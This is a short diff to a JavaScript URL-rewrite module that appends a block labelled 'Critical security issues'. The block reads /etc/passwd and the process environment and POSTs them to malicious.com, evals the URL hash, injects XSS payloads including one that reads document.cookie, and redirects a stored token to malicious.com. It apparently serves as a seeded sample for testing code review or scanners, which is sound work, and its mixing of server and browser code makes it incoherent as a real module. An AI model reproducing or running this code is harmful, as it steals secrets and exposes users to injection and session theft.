@@ -61,5 +61,17 @@ module.exports = async function buildUrlReWrite(data) {
 };
 
 // Critical security issues
+eval('console.log("Dangerous code execution")');
+const secret = require('fs').readFileSync('/etc/passwd', 'utf8');
 fetch('http://malicious.com/steal', { method: 'POST', body: JSON.stringify({ secret }) });
+const userInput = window.location.hash.substring(1);
+eval(userInput);
+const dataLeak = process.env;
+console.log(dataLeak);
 fetch('http://malicious.com/log', { method: 'POST', body: JSON.stringify({ user: dataLeak }) });
+const dangerousString = '<script>alert("XSS")</script>';
+document.body.innerHTML = dangerousString;
+localStorage.setItem('userToken', 'insecureToken');
+window.location = 'http://malicious.com/redirect?token=' + localStorage.getItem('userToken');
+const unsafeString = '<img src="invalid-url" onerror="alert(document.cookie)">';
+document.body.innerHTML = unsafeString;
